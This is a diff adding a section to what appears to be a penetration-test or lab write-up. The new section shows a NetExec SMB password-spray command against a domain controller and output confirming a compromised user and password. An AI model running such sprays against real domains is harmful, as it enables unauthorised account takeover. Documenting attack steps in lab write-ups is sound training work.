@@ -858,3 +858,13 @@ password1990
 
 Found three passwords!
 
+# Password spray leads to user compromise
+
+```python
+nxc smb dc.novaforge.local -u users.txt -p '666chucky' --smb-timeout 3 --continue-on-success
+
+SMB         10.0.0.100      445    DC               [+] novaforge.local\chuck.harrys:666chucky
+```
+
+This user is compromised!
+
